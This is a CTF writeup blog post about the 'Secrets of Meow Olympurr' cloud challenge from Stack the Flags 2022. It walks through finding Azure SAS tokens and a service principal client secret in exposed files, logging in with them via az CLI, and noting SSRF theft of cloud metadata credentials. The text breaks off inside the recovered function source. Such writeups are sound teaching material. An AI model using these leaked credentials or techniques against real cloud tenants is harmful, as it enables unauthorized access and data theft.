---
layout: post
title: Stack the Flags 2022
---

Introduction
------

Stack the Flags 2022 is the second iteration of GovTech's Capture the Flag competition. In this year's iteration, my team competed in the University category and managed to finish in 2nd place. Of the 51 challenges in the CTF, there was one in particular that really pushed me outside my comfort zone and I  wanted to do a writeup to record some of the things I learnt in the process of solving it. 

---


Cloud: Secrets of Meow Olympurr
------

### Preface

This was my second cloud challenge. I actually quite enjoyed the cloud challenge in TISC 2022 (see the [writeup here](https://blog.puddle.sg/write-ups/2022-09-11-TISC-2022)) which was also made by the peeps over at GovTech, so I was looking forward to seeing Stack's cloud challenge. Throughout the writeup, you will notice that I reference the TISC challenge quite a bit because most of my thought process and approach actually stem from what I learned from the challenge. 

### Information Gathering

From the get-go, we are only provided with a short description and a URL to begin the challenge. 

> Jaga reached Meow Olympurr and met some native Meows. While cautious at first, they warmed up and shared that they have recently created a website to promote tourism!  
However, the young Meows explained that they are not cy-purr security trained and would like to understand what they might have misconfigured in their environments. The young Meows were trying to get two different environments to work together, but it seems like something is breaking....  
Log a cy-purr security case by invoking the mysterious function and retrieve the secret code!  
`d2p9lw76n0gfo0.cloudfront.net ` 

While most of the description is storyline fluff (hehe pun intended), we are told to "retrieve the secret code" by "invoking the mysterious function". From this, we can safely assume that the end goal is to call some serverless cloud function that would give us the flag. 

Visiting the URL brings us to a page with a bunch of cats and seemingly nothing else. Viewing the source doesn't give us much either. 


![initial page](../../attachments/stf22/initialpage.png)


With no user input and the page served on a CDN, we're given very little to start. This can be terrifying because not being able to get to the cloud part of a cloud challenge is just massively demoralizing. Thankfully, I knew that there must be some way or hint to lead us deeper in. In TISC this came in the form of an HTML comment, and for this challenge, this "hint" was hidden in `robots.txt`. 

Navigating to `/robots.txt`, it is immediately obvious that there was some effort put into creating this page. Viewing the HTML, the image source sticks out like a sore thumb. 


```html
<div class="col-sm" >
	<img src="http://18.141.147.115:8080/https://meowolympurr.z23.web.core.windows.net/images/ohno.jpg"/>
</div>
```

_Alright, we're getting somewhere. The links are stacked? Ok, let's take things one at a time._ 

Visiting `http://18.141.147.115:8080/` there is a whole bunch of plain text. 

```
This API enables cross-origin requests to anywhere.

Usage:

/               Shows help
/iscorsneeded   This is the only resource on this host which is served without CORS headers.
/<url>          Create a request to <url>, and includes CORS headers in the response.

If the protocol is omitted, it defaults to http (https if port 443 is specified).

Cookies are disabled and stripped from requests.

Redirects are automatically followed. For debugging purposes, each followed redirect results
in the addition of a X-CORS-Redirect-n header, where n starts at 1. These headers are not
accessible by the XMLHttpRequest API.
After 5 redirects, redirects are not followed any more. The redirect response is sent back
to the browser, which can choose to follow the redirect (handled automatically by the browser).

The requested URL is available in the X-Request-URL response header.
The final URL, after following all redirects, is available in the X-Final-URL response header.


To prevent the use of the proxy for casual browsing, the API requires either the Origin
or the X-Requested-With header to be set. To avoid unnecessary preflight (OPTIONS) requests,
it's recommended to not manually set these headers in your code.


Demo          :   https://robwu.nl/cors-anywhere.html
Source code   :   https://github.com/Rob--W/cors-anywhere/
Documentation :   https://github.com/Rob--W/cors-anywhere/#documentation
```

I spent a couple minutes verifying the website really does what it says it does (can't be sure of anything nowadays), and with nothing immediately suspicious, I moved on. I didn't really bother investigating deeper into this because, 

1. We had another link and I wanted to see what's going on with that. 
2. I conveniently forgot you could steal EC2 Metadata Credentials via SSRF. More on that [here](https://scalesec.com/blog/exploit-ssrf-to-gain-aws-credentials/).

On to the next site we go. Visiting `https://meowolympurr.z23.web.core.windows.net/`, we are greeted with a familiar site. Could this be the origin server which the CDN is pulling data from? Wait... how did the challenge author register the `windows.net` domain? Surely that would belong to Microsoft, right? Hold on... the site is slightly different... There's something extra at the bottom. 

![extra](../../attachments/stf22/extra.png)

```html
<div class="p-5 text-center bg-light">
	<p class="lead text-muted">
		Have an event you are interested to host but it is not listed here? Submit it 
		<a href="https://olympurr-app.azurewebsites.net/api/meowvellous">here</a>!
	</p>
</div>
```

_Another link? Wait... is that azure? Could `windows.net` be...? Is everything really on Azure? Oh no..._

This was truly devastating. What little confidence I had starting this challenge had now disappeared. Now, if you're wondering why I reacted like this. Well... it's because my next step was to create an azure account!! It had taken me a week to solve the TISC cloud challenge on AWS. But it was 9 pm and with slightly less than 25 hours left, I didn't have much time to figure out Azure... 

After staring at the scoreboard for a few seconds and letting the peer pressure to solve pile on, I visited `https://olympurr-app.azurewebsites.net/api/meowvellous`.


```
Found an interesting event you would like to organise in Meow Olympurr?
Pass the URL as a query string. You will see the submitted information if it is successful. 
e.g. https://olympurr-app.azurewebsites.net/api/meowvellous?url=<INSERT>
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠈⠻⣮⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡿⠋⠀⠀⠀⠀⠙⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠿⠿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣠⣤⣤⣀⡀⠀⠀⣀⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⠀⠀
⢀⣤⣾⡿⠟⠛⠛⢿⣿⣶⣾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣀⣀⣤⣶⣿⡿⠿⢿⣿⡀⠀
⣿⣿⠏⠀⢰⡆⠀⠀⠉⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⡿⠟⠋⠁⠀⠀⢸⣿⠇⠀
⣿⡟⠀⣀⠈⣀⡀⠒⠃⠀⠙⣿⡆⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀
⣿⡇⠀⠛⢠⡋⢙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
⣿⣧⠀⠀⠀⠓⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠀⠀⢸⣧⣤⣤⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠀⠀
⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⣷⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁⠀⠀
⠈⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⣶⣤⣤⣀⡀⠀⠀⠀⢀⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⣄
   Send us the details!            ⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣹
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⢸⣧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣤⣄⣀⡀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣻⣷⣶⣾⣿⣿⡿⢯⣛⣛⡋⠁⠀⠀⠉⠙⠛⠛⠿⣿⣿⡷⣶⣿

```

_Cute cat, but doesn't this site do the same thing as `http://18.141.147.115:8080/`?_  I spent a couple minutes just messing around with the site, visiting `/` and `/api` (they give nothing) before going back to `https://meowolympurr.z23.web.core.windows.net/`. I hadn't finished exploring that site yet, and it felt like I might've jumped the gun. True enough, at `https://meowolympurr.z23.web.core.windows.net/robots.txt`, we find more clues. 

```html
<main role="main">
    <!--
        To do
        * Integrate services hosted on different cloud platforms
    -->
    <div class="album py-5 bg-light">
        <div class="container d-flex justify-content-center">
            <div class="row">
              <div class="col-sm">
              </div>
              <div class="col-sm" >
                <img src="images/ohno.jpg?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D"/>
              </div>
              <div class="col-sm">
              </div>
              
            </div>
          </div>
    </div>

    <!-- 
      For access to website source codes: 
      https://meowolympurr.blob.core.windows.net?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D
    -->

</main>
```


_Source code? Oh yes! Quick let's go get it. Wait, what? Ok, maybe I copied it wrongly. Let me try that again..._


```xml
<Error>
	<Code>InvalidQueryParameterValue</Code>
	<Message>Value for one of the query parameters specified in the request URI is invalid. RequestId:37eb1348-401e-0066-7bc9-08ac72000000 Time:2022-12-05T16:52:00.6880805Z</Message>
	<QueryParameterName>comp</QueryParameterName>
	<QueryParameterValue/>
	<Reason/>
</Error>
```

The link gives us an error??? This challenge playing with my feelings. Still living in denial, I opened a ticket to ask whether the link was correct and indeed it was... 

![discord msg](../../attachments/stf22/discord.png)

_Wait, hold on... Is it even possible to use a URL wrongly?_

With this small nudge, I went to google the error returned by the site and found this [Stackoverflow](https://stackoverflow.com/questions/66024316/invalidqueryparametervalue-in-query-blob-contents-using-rest-api) answer. While it didn't really answer my question directly, I was able to make some sense of what was going on. 

1. I was missing a `comp` URL query parameter. I was still not exactly sure what we need to put there, but there needs to be something there. (I would later decide to use CLI rendering this info useless, but essentially it's like a command perimeter. Doing `comp=list` would list the containers in the blob, more on that later)
2. This thing:`sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D`, is a SAS Token. But what is a SAS Token?

SAS stands for "Shared Access Signature" and it is used to grant access to specific resources in Azure. To further break down the token into its parameters, 

- `sv=2017-07-29` is the storage version
- `ss=b` is the resource type, with `b` corresponding to `blob`, Azure's equivalent of AWS S3
- `se=2022-12-12T00:00:00` is the expiration time
- `st=2022-09-01T00:00:00Z` is the token start time. It is when the token becomes valid.
- `spr=https` specifies the protocol restriction. This means that we can only use `https` and not `http`
- `sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D` is the signature to ensure the above parameters are unchanged

While reading up on this, I found out that the SAS token can be used in the command line as well, so I switched to cli. I decided to use Docker to do this because I was on Linux and had problems with my `apt` (should've probably fixed it before the CTF started but oh well) and also because docker was a simple one-liner.  

```
docker run -it mcr.microsoft.com/azure-cli
```

To construct our command, I relied a lot on the errors returned by the cli, this was something I picked up from manually enumerating AWS in TISC (I guess not knowing about pacu was a blessing in disguise). It was perhaps also why I felt more comfortable doing stuff on cli as compared to URLs. Since it would be too long to document everything, I'll just show one example of how the errors guided me to the right commands. 

With the knowledge that blob should function similarly to s3, the first thing I wanted to do was to list the objects in storage. A quick google brings us to 
[documentation](https://learn.microsoft.com/en-us/cli/azure/storage/blob?view=azure-cli-latest). 


Starting off with just a blind copy-paste of the example command, we have


```
bash-5.1# az storage blob list 
the following arguments are required: --container-name/-c

Examples from AI knowledge base:
az storage blob list --container-name MyContainer --prefix foo
List all storage blobs in a container whose names start with 'foo'; will match names such as 'foo', 'foobar', and 'foo/bar'

az storage blob list --account-key 00000000 --account-name myaccount --container-name MyContainer
List blobs in a given container. (autogenerated)

az storage account list
List all storage accounts in a subscription.

https://docs.microsoft.com/en-US/cli/azure/storage/blob#az_storage_blob_list
Read more about the command in reference docs

```

Ok looks like we need a container name. A quick google search tells us we can list the containers. So now the command is, 

```
bash-5.1# az storage container list
Please provide storage account name or connection string.
```

Now we need a storage account name. How do we find that? Google again, and we figure out that actually, the URL subdomains mean something. 

`https://meowolympurr.blob.core.windows.net`, follows the general format of an Azure service URL. In this case, `meowolympurr` Azure account, `blob` refers to the service, and the rest is unimportant (but if you really want to know it means it is using the Windows operating system). With this, we have

```
bash-5.1# az storage container list --account-name meowolympurr

There are no credentials provided in your command and environment, we will query for account key for your storage account.
It is recommended to provide --connection-string, --account-key or --sas-token in your command as credentials.

You also can add `--auth-mode login` in your command to use Azure Active Directory (Azure AD) for authorization if your login account is assigned required RBAC roles.
For more information about RBAC roles in storage, visit https://docs.microsoft.com/azure/storage/common/storage-auth-aad-rbac-cli.

In addition, setting the corresponding environment variables can avoid inputting credentials in your command. Please use --help to get more information about environment variable usage.

Skip querying account key due to failure: Please run 'az login' to setup account.
Server failed to authenticate the request. Please refer to the information in the www-authenticate header.
RequestId:60b47e9a-801e-0056-1cd4-0812bd000000
Time:2022-12-05T18:06:26.9733564Z
ErrorCode:NoAuthenticationInformation
```

Appending the SAS token (ensuring to wrap in quotes cause cli) as mentioned, we have 

```bash
bash-5.1# az storage container list --account-name meowolympurr --sas-token "sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D"
[
  {
    "deleted": null,
    "encryptionScope": {
      "defaultEncryptionScope": "$account-encryption-key",
      "preventEncryptionScopeOverride": false
    },
    "immutableStorageWithVersioningEnabled": false,
    "metadata": null,
    "name": "$web",
    "properties": {
      "etag": "\"0x8DAC914387D8CC7\"",
      "hasImmutabilityPolicy": false,
      "hasLegalHold": false,
      "lastModified": "2022-11-18T03:23:11+00:00",
      "lease": {
        "duration": null,
        "state": "available",
        "status": "unlocked"
      },
      "publicAccess": null
    },
    "version": null
  },
  {
    "deleted": null,
    "encryptionScope": {
      "defaultEncryptionScope": "$account-encryption-key",
      "preventEncryptionScopeOverride": false
    },
    "immutableStorageWithVersioningEnabled": false,
    "metadata": null,
    "name": "dev",
    "properties": {
      "etag": "\"0x8DAC91438FC71A6\"",
      "hasImmutabilityPolicy": false,
      "hasLegalHold": false,
      "lastModified": "2022-11-18T03:23:11+00:00",
      "lease": {
        "duration": null,
        "state": "available",
        "status": "unlocked"
      },
      "publicAccess": null
    },
    "version": null
  }
]
```

Looks like we found our containers. Finally, to list the items in the dev container,  

```bash
bash-5.1# az storage blob list --account-name meowolympurr --sas-token "sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D" -c dev
[
  {
    "container": "dev",
    ...
    "name": "readme.md",
    ...
  }
]
```

Now that we found the file, how can we access it? Well, we can safely assume most of the command should stay the same, but instead of listing, we need to read. Instead of going to google again or reading docs, let's just let bash autocomplete. 

```
bash-5.1# az storage blob <spam tab here> --account-name meowolympurr --sas-token "sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D" -c \$web
--help               exists               query                snapshot
-h                   generate-sas         restore              sync
copy                 immutability-policy  rewrite              undelete
delete               incremental-copy     service-properties   update
delete-batch         lease                set-legal-hold       upload
download             list                 set-tier             upload-batch
download-batch       metadata             show                 url
```

Perfect. We can just use `download`, which would then prompt us for the parameter `--name/-n`. Giving us 

```
# Meow Olympurr 
One stop service for all fun activites in Meow Olympurr! 
    
All resources are hosted on a single tenant: 83e595f4-f086-4f2f-9de8-d698b6012093

Meows are not cy-purr security trained, but we are willing to learn! 
    
# To do 
1. Consolidate the asset list 
2. Seek advice from Jaga and team when they arrive! 
3. Integrate services 
4. Remove credentials used for debugging access to function app

# Function app - https://olympurr-app.azurewebsites.net/api/meowvellous
SAS token to access the scm-releases container: ?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D

## Credentials for debugging
The following service principal has the same privileges as the function app
Application ID: ee92075f-4ddc-4522-a12c-2bc0ab874c85
Client Secret: kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7
```

As shown above, having the errors guide our google searches to work stuff out on the fly. I would like to think this helped save a bit of time, as opposed to diving straight into docs. Since this is now getting a bit long, I will avoid detailing most of the obstacles I got stuck at, since I just used the above method to get through most of the easier syntax/parameter/command issues. 

The readme gives us

1. Link to functionapp, _but we already found that before_
2. New SAS token for scm-releases container, _where's that?_
3. Application ID and Client Secret, _how do we use that? Also, what is a service principle?_
4. Tenant, _again what is that?_

So many questions for one file, but in summary most of the information was just credentials to login which we can do on the cli with 

```bash
bash-5.1# az login --service-principal -u ee92075f-4ddc-4522-a12c-2bc0ab874c85 -p kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7 --tenant 83e595f4-f086-4f2f-9de8-d698b6012093
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "83e595f4-f086-4f2f-9de8-d698b6012093",
    "id": "bb11df92-eff5-47b6-b940-a3ce6ded6431",
    "isDefault": true,
    "managedByTenants": [],
    "name": "STF2022",
    "state": "Enabled",
    "tenantId": "83e595f4-f086-4f2f-9de8-d698b6012093",
    "user": {
      "name": "ee92075f-4ddc-4522-a12c-2bc0ab874c85",
      "type": "servicePrincipal"
    }
  }
]
```

With this, we can sort of repeat what we've done so far expecting more information to be revealed. We quickly figure out that there is another storage account 

```bash
bash-5.1# az storage account list
[
  {
    ...
    "name": "meowvellousappstorage",
    ...
    "primaryEndpoints": {
      "blob": "https://meowvellousappstorage.blob.core.windows.net/",
      "dfs": "https://meowvellousappstorage.dfs.core.windows.net/",
      "file": "https://meowvellousappstorage.file.core.windows.net/",
      "internetEndpoints": null,
      "microsoftEndpoints": null,
      "queue": "https://meowvellousappstorage.queue.core.windows.net/",
      "table": "https://meowvellousappstorage.table.core.windows.net/",
      "web": "https://meowvellousappstorage.z23.web.core.windows.net/"
    }
]
```

The SAS token didn't have perms to list the containers in this storage account, but it was a pretty safe guess to assume the container `scm-releases` was here. 

```
bash-5.1# az storage blob list --account-name meowvellousappstorage --sas-token "sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D" -c scm-releases
[
  {
    "container": "scm-releases",
    ...
    "name": "scm-latest-olympurr-app.zip",
    ...
  }
]
```

Now we have access to the source code which is a simple python script that appears to log stuff to AWS? _Ah, so this was what all the TODOs meant. Does that mean we're back to AWS? Just when I was getting comfortable with Azure..._ 


```py
import boto3
import requests
import json

import azure.functions as func
from azure.identity import ManagedIdentityCredential
from azure.keyvault.secrets import SecretClient

functionName = "event-webservice"
keyName = "AKIA5G4XMRW7TLT6XD7R"

def logURL(url):
    identity = ManagedIdentityCredential()
    secretClient = SecretClient(vault_url="https://olympurr-aws.vault.azure.net/", credential=identity)
    secret = secretClient.get_secret(keyName).value
    session = boto3.Session(
        aws_access_key_id=keyName,
        aws_secret_access_key=secret
    )
    
    lambda_client = session.client("lambda", region_name="ap-southeast-1")

    details = {"url" : url}
    lambda_client.invoke(
        FunctionName=functionName,
        InvocationType="RequestResponse",
        Payload=bytes(json.dumps(details), "utf-8")
    )
    return secret

def main(req: func.HttpRequest) -> func.HttpResponse:
    url = req.params.get('url')

    if not url:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            name = req_body.get('url')

    if url:
        # Log the URL in AWS 
        secret = logURL(url)
        try:
            response = requests.get(url)
            return func.HttpResponse(response.text)
        except Exception as e:
            return func.HttpResponse(str(e))
    
    return func.HttpResponse(
            """Found an interesting event you would like to organise in Meow Olympurr?
Pass the URL as a query string. You will see the submitted information if it is successful. 
e.g. https://olympurr-app.azurewebsites.net/api/meowvellous?url=<INSERT>
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠈⠻⣮⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡿⠋⠀⠀⠀⠀⠙⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠿⠿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣠⣤⣤⣀⡀⠀⠀⣀⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⠀⠀
⢀⣤⣾⡿⠟⠛⠛⢿⣿⣶⣾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣀⣀⣤⣶⣿⡿⠿⢿⣿⡀⠀
⣿⣿⠏⠀⢰⡆⠀⠀⠉⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⡿⠟⠋⠁⠀⠀⢸⣿⠇⠀
⣿⡟⠀⣀⠈⣀⡀⠒⠃⠀⠙⣿⡆⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀
⣿⡇⠀⠛⢠⡋⢙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
⣿⣧⠀⠀⠀⠓⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠀⠀⢸⣧⣤⣤⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠀⠀
⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⣷⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁⠀⠀
